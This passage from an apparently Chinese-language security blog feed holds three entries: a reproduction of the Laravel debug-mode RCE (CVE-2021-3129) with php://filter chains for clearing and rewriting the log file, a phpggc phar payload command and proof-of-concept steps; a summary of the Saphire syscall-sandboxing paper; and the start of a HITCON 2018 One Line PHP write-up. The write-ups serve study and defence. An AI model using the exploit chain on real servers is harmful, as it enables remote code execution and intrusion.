class="hljs-variable">$output</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>], <span class="hljs-variable">$output</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeOptional</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$parameters</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$originalContents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>]);<br>    <span class="hljs-variable">$newContents</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;$&#x27;</span>.<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;variableName&#x27;</span>], <span class="hljs-string">&#x27;$&#x27;</span>.<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;variableName&#x27;</span>].<span class="hljs-string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="hljs-variable">$originalContents</span>);<br><br>    <span class="hljs-variable">$originalTokens</span> = <span class="hljs-title function_ invoke__">token_get_all</span>(<span class="hljs-title class_">Blade</span>::<span class="hljs-title function_ invoke__">compileString</span>(<span class="hljs-variable">$originalContents</span>));<br>    <span class="hljs-variable">$newTokens</span> = <span class="hljs-title function_ invoke__">token_get_all</span>(<span class="hljs-title class_">Blade</span>::<span class="hljs-title function_ invoke__">compileString</span>(<span class="hljs-variable">$newContents</span>));<br><br>    <span class="hljs-variable">$expectedTokens</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">generateExpectedTokens</span>(<span class="hljs-variable">$originalTokens</span>, <span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;variableName&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$expectedTokens</span> !== <span class="hljs-variable">$newTokens</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$newContents</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>它就是把原本的 <code>$&lt;variableName&gt;</code> 變成 <code>$&lt;variableName&gt; ?? &#39;&#39;</code> 然後寫回頁面，這裡的 variableName 就是剛剛 request 中的 <code>username</code>，其中在 <code>generateExpectedTokens</code> 那邊一大堆其實就只是在檢查有沒有真的如預期生成 <code>$&lt;variableName&gt; ?? &#39;&#39;</code> 這東西而已，所以在 <a href="https://www.ambionics.io/blog/laravel-debug-rce">漏洞敘述的文章</a> 中也有提到可以簡化成這樣</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>]);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;viewFile&#x27;</span>], <span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><p>到這邊可以用到 <code>file_get_contents</code> 拿到有 payload 的檔案然後再寫出來，但需要一個可以寫 payload 的地方，如果有機會可以上傳檔案，就可以簡單的利用 <a href="https://github.com/ambionics/phpggc">phpggc</a> 來構造 payload (monolog&#x2F;rce1 就能用)，然後直接用 viewFile 的地方用 <code>phar://</code> 協議 exploit<br><img src="https://i.imgur.com/dRvoQRt.png"></p><p>但如果不行的時候，laravel 預設的 log 在 <code>storage/logs/laravel.log</code> 是一個有機會可控的地方，送一個 POST 看看能不能寫東西進去<br><img src="https://i.imgur.com/kJJva6I.png"></p><p><img src="https://i.imgur.com/gGY61zv.png"><br>可以，但是為了後續寫檔，先把 log 整個清空會比較好，一開始我也很直覺的想到用 base64 多次 decode 把東西清掉，披露文章一開始也是這樣想，但是會出現問題</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">&quot;viewFile&quot;:&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/www/html/storage/logs/laravel.log&quot;<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/wYW02K1.png"></p><p>我用了三次 decode 以後出現 ErrorException 了，回去查看 log 也沒有被成功被清空，測試以後發現是 <code>=</code> 的問題，有 <code>=</code> 就有機會出事，多次用 base64 decode 以後總有機會出現 <code>=</code>，實在太難掌控了<br><img src="https://i.imgur.com/7KeA2GA.png"></p><p>所以文章說到他們又回去找有沒有別的 filter 可以用，文章說用 <code>consumed</code> filter 就可以清空檔案了，但這東西我翻遍 php doc 都找不到不知道是哪裡來的，後來翻到 <a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">一篇文</a> 裡面用了另外一種方法，提到既然有 <code>=</code> 會出事，先讓內容先都變成非 base64 字元再 base64 decode，自然就會全部消失了，用的方法是 <code>UTF-8 -&gt; UTF-16BE -&gt; printable -&gt; UTF-8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log<br></code></pre></td></tr></table></figure><p>成功清空 log 了，剩下就是要怎麼讓寫入的 payload 留下來，在剛剛測試的時候看到 log 的格式，於是再來又要處理兩點</p><ol><li>前面的 prefix</li><li>Payload 出現了兩次<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[prefix]</span>PAYLOAD<span class="hljs-selector-attr">[midfix]</span>PAYLOAD<span class="hljs-selector-attr">[suffix]</span><br></code></pre></td></tr></table></figure>原文的方法是先過一遍 <code>convert.iconv.utf16le.utf-8</code>，把一般的 payload 用 null byte padding 過就能濾掉沒 padding 過的非 utf16le 的字元了<br><img src="https://i.imgur.com/BTvDfHV.png"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;123456321ij T\0E\0S\0T\0 sdfghjkluyhjkio&quot;</span> &gt; /tmp/test.txt</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">php -r <span class="hljs-string">&quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);&quot;</span></span><br>㈱㐳㘵㈳椱⁪TEST猠晤桧歪畬桹歪潩<br></code></pre></td></tr></table></figure>在實驗的時候也會發現到如果沒有好好 padding 就沒辦法正常 convert 出來，這裡文章巧妙的利用在 payload 裡面多加一 byte 來讓他對不齊（兩次 payload 之間夾著奇數 byte），這個做法可以成功處理 padding 問題，又能解決 payload 出現兩次這點 (第一次沒有成功對齊第二次就會對齊)<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"># echo <span class="hljs-operator">-</span>ne <span class="hljs-string">&quot;123456321fi T<span class="hljs-subst">\0</span>E<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>T<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>X sdfghf T<span class="hljs-subst">\0</span>E<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>T<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>X kluyhjkio</span><br><span class="hljs-string">&quot;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>test.txt<br><br># php <span class="hljs-operator">-</span>r <span class="hljs-string">&quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);&quot;</span><br>㈱㐳㘵㈳昱⁩<span class="hljs-type">TESTS</span><span class="hljs-operator">⁘</span>摳杦晨吠䔀匀吀匀堀欠畬桹歪潩<br><br># echo <span class="hljs-operator">-</span>ne <span class="hljs-string">&quot;123456321fij T<span class="hljs-subst">\0</span>E<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>T<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>X sdfghf T<span class="hljs-subst">\0</span>E<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>T<span class="hljs-subst">\0</span>S<span class="hljs-subst">\0</span>X kluyhjkio&quot;</span> <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>test.txt<br><br># php <span class="hljs-operator">-</span>r <span class="hljs-string">&quot;echo file_get_contents(&#x27;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#x27;);&quot;</span><br><span class="hljs-type">Warning</span>: file_get_contents(): iconv stream filter (<span class="hljs-string">&quot;utf16le&quot;</span><span class="hljs-operator">=&gt;</span><span class="hljs-string">&quot;utf-8&quot;</span>): invalid multibyte sequence <span class="hljs-keyword">in</span> <span class="hljs-type">Command</span> line code on line <span class="hljs-number">1</span><br>㈱㐳㘵㈳昱橩吠䔀匀吀匀堀猠晤桧⁦<span class="hljs-type">TESTS</span><span class="hljs-operator">⁘</span>汫祵橨楫<br></code></pre></td></tr></table></figure>但是到這裡又出現兩個問題</li><li>前面那次測試也有出現的那個 warning</li><li>Null byte 經過 file_get_contents 也會出現 warning</li></ol><p>第一個問題可以先寫一次 padding 來解決，讓 prefix、midfix、suffix 都分別出現雙數次</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[prefix]</span><span class="hljs-attribute">padding</span><span class="hljs-selector-attr">[midfix]</span><span class="hljs-attribute">padding</span><span class="hljs-selector-attr">[suffix]</span><br><span class="hljs-selector-attr">[prefix]</span>PAYLOAD<span class="hljs-selector-attr">[midfix]</span>PAYLOAD<span class="hljs-selector-attr">[suffix]</span><br></code></pre></td></tr></table></figure><p>第二個問題文章提出用 <code>=00</code> 來代替 Null bytes 然後再過 <a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">convert.quoted-printable-decode</a> 就能安全通過了，所以最後 payload 會是 <code>base64</code> -&gt; <code>utf16le</code> -&gt; <code>null to =00</code> 然後過這個 filter 回來</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol><li>清空 error log <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-built_in">convert</span>.iconv.utf<span class="hljs-number">-8.</span>utf<span class="hljs-number">-16</span>be|<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.iconv.utf<span class="hljs-number">-16</span>be.utf<span class="hljs-number">-8</span>|<span class="hljs-built_in">convert</span>.base64-decode/resource=../storage/logs/laravel.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure> 或是 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=..<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure></li><li>先送一個確保 alignment 的 request<br> <img src="https://i.imgur.com/CXnUVHt.png"><br> 在送第一次的 alignment 用的 request 的時候，因為 payload 送出後產生的 log 會是 <code>failed to open stream: File name too long</code> 的 error，第一次送的 payload “viewFile” 長一點也產生一樣的 error 會比較不容易出錯（”viewFile” 如果比較短 error 會是 <code>failed to open stream: No such file or directory</code>）</li><li>產生 payload，用前面有提到過的 phpgcc 生成</li><li>經過 base64 encode 後再加上 padding 變 utf16le 然後把 null 換成 <code>=00</code>，這裡用 <code>Laravel/RCE8</code> 或 <code>monolog/rce1</code> 都可以 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/phpggc monolog/</span>rce1 system <span class="hljs-string">&quot;touch /tmp/pwned&quot;</span> --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0 | sed -E <span class="hljs-string">&#x27;s/=+$//g&#x27;</span> | sed -E <span class="hljs-string">&#x27;s/./\0=00/g&#x27;</span><br></code></pre></td></tr></table></figure></li><li>送要寫進 error.log 中的 payload<br> 測試時一直出現 <code>stream filter (convert.quoted-printable-decode): invalid byte sequence</code> 的錯誤，結果發現 log 的 stacktrace 中也會出現一部分的 payload，如果直接單純的送 payload 就會出現錯誤<br> <img src="https://i.imgur.com/Qz0gSMC.png"><br> 所以在這一步驟發現 payload 還得在開頭塞一點垃圾來避免因為下面出現了一點 convert 過的 payload 讓 filter 出問題，建議這個垃圾要塞 &gt; 15 奇數個字<br> <img src="https://i.imgur.com/CYtWwCi.png"></li><li>把 payload decode 回來並清掉 payload 以外的垃圾<br> <img src="https://i.imgur.com/mVcb6k9.png"></li><li>用 phar:&#x2F;&#x2F; 去觸發 payload<br> <img src="https://i.imgur.com/4Txa9XS.png"><br>成功寫檔<br><img src="https://i.imgur.com/s8mGMDJ.png"></li></ol><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>用 php 造 phar 的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exploit.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&#x27;</span>.<span class="hljs-string">&#x27;&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-keyword">new</span> &lt;class_name&gt;);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul><li><a href="https://www.ambionics.io/blog/laravel-debug-rce">LARAVEL &lt;&#x3D; V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION</a></li><li><a href="https://zhuanlan.zhihu.com/p/344568679">Laravel Debug模式下远程代码执行漏洞分析</a></li><li><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现</a></li><li><a href="http://blog.orange.tw/2018/10/">HITCON CTF 2018 - One Line PHP Challenge</a></li><li><a href="https://tari.moe/2021/06/03/laravel8-debug-rce/">Laravel8 CVE-2021-3129 复现分析 - tari moe</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE-survey</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Saphire: Sandboxing PHP Applications with Tailored System Call Allowlists</title>
    <link href="/2022/02/22/2022-02-22-Saphire/"/>
    <url>/2022/02/22/2022-02-22-Saphire/</url>
    
    <content type="html"><![CDATA[<blockquote><p>paper: <a href="https://www.usenix.org/system/files/sec21-bulekov.pdf">https://www.usenix.org/system/files/sec21-bulekov.pdf</a></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><ul><li>像是 PHP、Python 都是直譯式語言，這些直譯式語言寫的 app 常常都會整個用同樣而且太多餘的權限跑，這就違反了 PoLP，也就是愈少權限愈好的原則，讓整個系統暴露在危險，只要被 RCE 就很容易直接被拿到太高的權限，暴露在更高的風險裡</li><li>這篇 paper 想做到的就是 PoLP，正確的控管權限，用的是他們提出的自動產生 syscall policy 給每個各別 program</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><ul><li>RCE</li><li>seccomp<ul><li>指定 process 只能呼叫特定的 system call</li></ul></li><li>ptrace<ul><li>使得一個追蹤者程序能夠觀察或控制另外一個受追蹤者程序的內容（如記憶體或暫存器）或執行流程</li><li>主要被用來時做 debugger 或 trace syscall</li></ul></li></ul><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h3 id="Interpreters"><a href="#Interpreters" class="headerlink" title="Interpreters"></a>Interpreters</h3><ul><li>Interpreted program : 需要 interpreter 來執行的程式</li><li>Interpreter 可以直接被 OS 和硬體執行</li></ul><p>所以 interpreted program 是可攜帶的，通常 interpreted program 會提供由數個 function 組成的 API 給使用者，而只有這些 API 能夠碰到 syscall，即使經過 JIT，也是會經由 API 才能 call 到 syscall</p><h4 id="An-API-for-all-interpreted-programs"><a href="#An-API-for-all-interpreted-programs" class="headerlink" title="An API for all interpreted programs"></a>An API for all interpreted programs</h4><p>因為這些 API 通常都要很泛用，一次通常也會用到許多 syscall，所以單純的 filter syscall 是沒有意義的，不過一個 program 可能只會用到一小部分的 syscall，這種時候 filter 這招就可以派上用場了<br><img src="https://i.imgur.com/d7kG04y.png?300x"><br>像是 Prog1 不需要用到 syscall1，可以 filter 掉</p><h3 id="Securing-Interpreted-Programs"><a href="#Securing-Interpreted-Programs" class="headerlink" title="Securing Interpreted Programs"></a>Securing Interpreted Programs</h3><ul><li>Mapping the interpreter API to syscalls<br>  用上靜態和動態分析來 map API function handler 到 syscall</li><li>Identifying API calls within an interpreted program<br>  找出各個 code 裡面用到的 function，包括所有 dependencies (不管是 implicit 還是 explicit) 然後搭配前面的 mapping 結果產出 allowed list</li><li>Protecting the Program<br>  把 allowed list 應用在 program 上</li></ul><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p>上面提到的步驟，這裡會用 PHP 實作然後解釋<br><img src="https://i.imgur.com/z7f9M0A.png"></p><h3 id="Mapping-built-in-PHP-functions-to-system-calls"><a href="#Mapping-built-in-PHP-functions-to-system-calls" class="headerlink" title="Mapping built-in PHP functions to system-calls"></a>Mapping built-in PHP functions to system-calls</h3><p>把 PHP functions mapping 到他用到的 system call</p><ul><li>先用 static call-graph analysis 做初步 mapping</li><li>再用 ptrace 去觀察跑 PHP process 時用到的 syscall</li></ul><h4 id="Static-analysis-over-the-PHP-Interpreter"><a href="#Static-analysis-over-the-PHP-Interpreter" class="headerlink" title="Static analysis over the PHP Interpreter"></a>Static analysis over the PHP Interpreter</h4><ul><li>用 symbols 來建構整個 interpreter 和 lib 的 static call-graph (每個 node 是個 function 然後每個 edge 是 direct function call)</li><li>為了找出所有 handler，用 <code>get_defined_functions()</code> 來找出所有 built-in PHP function handler 的地址</li></ul><p>雖然這步是 static，但需要用很多 code-bases 跑過 (看過 code 這裡也說需要跑超過 30 分鐘)</p><h4 id="Refining-the-mapping-through-dynamic-analysis"><a href="#Refining-the-mapping-through-dynamic-analysis" class="headerlink" title="Refining the mapping through dynamic analysis"></a>Refining the mapping through dynamic analysis</h4><p>雖然上一步已經暴搜了整個 PHP process 的 code，但是會漏掉 indirect calls，像是 PHP 的 fopen 可以去拿到 remote files，也有些 function 像是 <code>mail()</code> 會去執行 <code>sendmail</code> 這個 bin，單純靜態分析 map 不到 sendmail call 到的那些 syscall</p><ul><li>TE 從 shared memory 中找出正在跑的 php function name</li><li>TR 利用 ptrace 來攔截 syscall</li></ul><p>用這兩個組合起來就能動態的 map 到這種 function </p><h3 id="Creating-system-call-filters-for-web-apps"><a href="#Creating-system-call-filters-for-web-apps" class="headerlink" title="Creating system-call filters for web apps"></a>Creating system-call filters for web apps</h3><p>這個步驟的目的是找出 interpreter 會 invoke 哪些 PHP built-in function，然後和上一個步驟產生的 mapping 表對照生成這個 web app 中的每個 script 可能會 call 到哪些 system call</p><ul><li>先去 iterate web app 中的所有 PHP files<ul><li>用 php-parser 來生出 Abstract syntax tree (AST)</li><li>掃這個 AST 來找出可能的 built-in function call</li><li>檢查 assignment 來確認 class type，進而對應 function</li></ul></li><li>找出 AST 中的 dependencies<ul><li>constant definitions</li><li>class definitions&#x2F;instantiations</li><li>include&#x2F;require operations</li></ul></li></ul><p>最費工的會是處理 dependency 的部分，若是單純的 include 就可以很輕鬆的處理，但是如果用上一些 variable 或是 constant 就會需要額外處理</p><h4 id="String-representation"><a href="#String-representation" class="headerlink" title="String representation"></a>String representation</h4><p>會用各種方法對不同種類的 include string 轉換，直到不能處理或是處理完為止<br>![](<a href="https://i.imgur.com/CIULMjv.png">https://i.imgur.com/CIULMjv.png</a> &#x3D;500x)<br>(variable 如果被 assign 很多次就一一找出，若是不行就會把所有可能性都列出)</p><h4 id="Unresolved-Includes"><a href="#Unresolved-Includes" class="headerlink" title="Unresolved Includes"></a>Unresolved Includes</h4><p>到這裡 74% 的 include 可以解決，剩下的可以被 fuzzy resolved，也就是把一個小集合的內容都當作是有 include 到的。<br>有些 include 完全沒辦法從靜態分析中獲得任何資訊，這種時候他們有提供 Conservative Includes 的選項，用的就是這種方法，開了這個選項以後 FP 的機率會降低，但是 allowed list 中的內容就會變得比較多。</p><h4 id="Building-system-call-profiles-for-Scripts"><a href="#Building-system-call-profiles-for-Scripts" class="headerlink" title="Building system-call profiles for Scripts"></a>Building system-call profiles for Scripts</h4><p>最後手上有了一個 script 和他的 dependency 會 call 的 PHP function 和前一步得到的這個 mapping 以後就能生出一個 script 對應到 syscall 的 profile 了 (script path &lt;-&gt; profile)</p><h3 id="Sandboxing-the-Interpreter-and-Web-App"><a href="#Sandboxing-the-Interpreter-and-Web-App" class="headerlink" title="Sandboxing the Interpreter and Web App"></a>Sandboxing the Interpreter and Web App</h3><p>利用 seccomp 來實作這個 allowed list，這個 SE extension 會在 process 跑起來的時候知道他跑了其中的哪一個 script 然後告訴 kernel 要用哪個 syscall allowed list。<br>所以這個 SE 在一個 interpreter 的 lifetime 裡總共會跑兩次，第一次是 PHP process 跑起來的時候，所有 allowed list 會被 load 到 memory 裡，然後收到 request 的時候，會把要用的 allowed list 給 kernel。<br>(使用 <code>libseccomp</code> 來把一連串的 syscall 轉成 allowlist)</p><ul><li>通常 web request 會是 web server (像是 nginx 或 apache) handle 的，所以他們也有把這個 plugin 裝到 web server 上，然後也有裝到 PHP cli API 中 (就是 command line 的)</li><li>因為用了 seccomp 所以一個 process 只能跑一個 script (因為一個 process 不能突然換 allowed list)<ul><li>一個 PHP interpreter process 只能用在一個 request，但 loading 很重的時候這種做法會導致 latency 變很高</li><li>每個 PHP worker 可以 handle 很多 request 但是同一個 worker 只能 handle 用同一個 script 的 request</li></ul></li></ul><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><h3 id="dependency-的解析"><a href="#dependency-的解析" class="headerlink" title="dependency 的解析"></a>dependency 的解析</h3><ul><li>把所有 dependency 分成 literal 就能解決和需要 dynamic 解決的</li><li>Resolved avg -&gt; 74%</li><li>Fuzzy resolved -&gt; 22%</li><li>Class 85%</li><li>像是 Joolma 會把很多原本的 class 改成用 alias 去 call，這種時候就沒辦法抓到<br><img src="https://i.imgur.com/gzLlySS.png"></li></ul><h3 id="Syscall-Profile-Size"><a href="#Syscall-Profile-Size" class="headerlink" title="Syscall Profile Size"></a>Syscall Profile Size</h3><ul><li>想知道會 filter 掉多少 syscall 和 CI 的成效，看 syscall profile 的 size，size 愈大就會有愈多可以用的 syscall，所以在能跑的範圍內盡量愈小愈好</li><li>特別也 evaluate 了危險的 syscall<br><img src="https://i.imgur.com/WwM9SjR.png"></li><li>黑線是 CI 沒有開的時候<ul><li>開起來的時候 FP 會降低，但危險性會增加</li></ul></li><li>filter 掉大概 80% 的危險 system-call</li><li>有些常見的 function 常常在很多的 script 中出現，就會讓很多 script 的 profile 很相似</li></ul><h3 id="Defense-Capabilities"><a href="#Defense-Capabilities" class="headerlink" title="Defense Capabilities"></a>Defense Capabilities</h3><ul><li>找了 21 個 RCE exploit 來測試<br><img src="https://i.imgur.com/8R8AxXz.png"></li><li>Is too restrictive?<ul><li>計算 coverage 來證明程式有正常被執行</li><li>在開了 CI 以後完全沒 FP</li><li>關了以後<ul><li>Joomla 因為前面提到的 alias 問題</li></ul></li></ul></li><li>Payload constraint?<ul><li>filter 過後的危險 syscall 不足以合成可以 ACE 的 payload，他們也有額外做很多測試，發現剩下的 syscall 都會缺少可以組 payload 的部分</li></ul></li><li>Non-vuln plugins<ul><li>對沒有漏洞的 plugin 也測試來評估 FP<br><img src="https://i.imgur.com/1LBgDRI.png"></li></ul></li><li>Runtime Overhead<ul><li>重點在 implement 到 web app 以後，因為前面有提到的 seccomp 問題，每次處理完 request process 都要重新跑起來</li><li>結果是 overhead 小到可以忽略的，即使是特別 trivial 的 script 也沒有影響太大，尤其他們又實作了 “同一個 worker 只能 handle 用同一個 script 的 request” 的方法後，影響又更小了<br><img src="https://i.imgur.com/nhoqfJO.png"></li></ul></li></ul><h2 id="Limitations-and-Discussion"><a href="#Limitations-and-Discussion" class="headerlink" title="Limitations and Discussion"></a>Limitations and Discussion</h2><ul><li>eval() system()<ul><li>他們沒有處理這兩種和其中的參數</li></ul></li><li>Mimicry<ul><li>雖然效果已經很好而且在測試中沒有被 RCE，但還是有些危險 syscall 被 allow 而且有機會被拼成 payload</li></ul></li><li>Overwriting scripts<ul><li>如果攻擊者可以竄改 script 讓 profile 被誤導，這個單純用 checksum 可以解決</li></ul></li><li>Writing to sensitive files<ul><li>為了避免被寫檔案拿權限，他們還會用 ptrace 來確保 interpreter 沒辦法碰到一些重要的 fd(file descriptor)</li></ul></li><li>Installing plugins<ul><li>安裝新 plugin 的時候就會馬上幫他建立 profile，但需要手動</li></ul></li><li>Filter system call argument<ul><li>除了直接 filter syscall 以外，如果也對參數 filter 可以更精準</li></ul></li><li>Line coverage og evaluated web apps</li><li>Applying Saphire to other interpreters<ul><li>Python interpreter running a program composed of multiple python scripts</li><li>A server executing multiple Node.JS microservices</li><li>classic CGI-based interpreted web-app using a language such as Perl or Lua</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>paper</tag>
      
      <tag>security</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON 2018 One Line PHP Challenge</title>
    <link href="/2021/10/22/2021-10-22-HITCON_2018_One_Line_PHP/"/>
    <url>/2021/10/22/2021-10-22-HITCON_2018_One_Line_PHP/</url>
    
    <content type="html"><![CDATA[<p>這是 orange 出的 one line php，每年他都會出一題這樣的題目，這一題主要用到的是 session.upload_progress 的利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  (<span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;orange&#x27;</span>]) &amp;&amp; @<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_</span>)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;@&lt;?php&#x27;</span> ? <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_</span>) : <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><blockquote><p>P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04</p></blockquote><h2 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h2><ul><li>enabled<br>  若是在 <code>session.upload_progress.enabled=On</code> (&#x2F;etc&#x2F;php&#x2F;7.4&#x2F;apache2&#x2F;php.ini 中) 的時候，會把上傳檔案時的一些資訊存在 session 裡面 (session 位置 &#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions)，所以就可以在 LFI 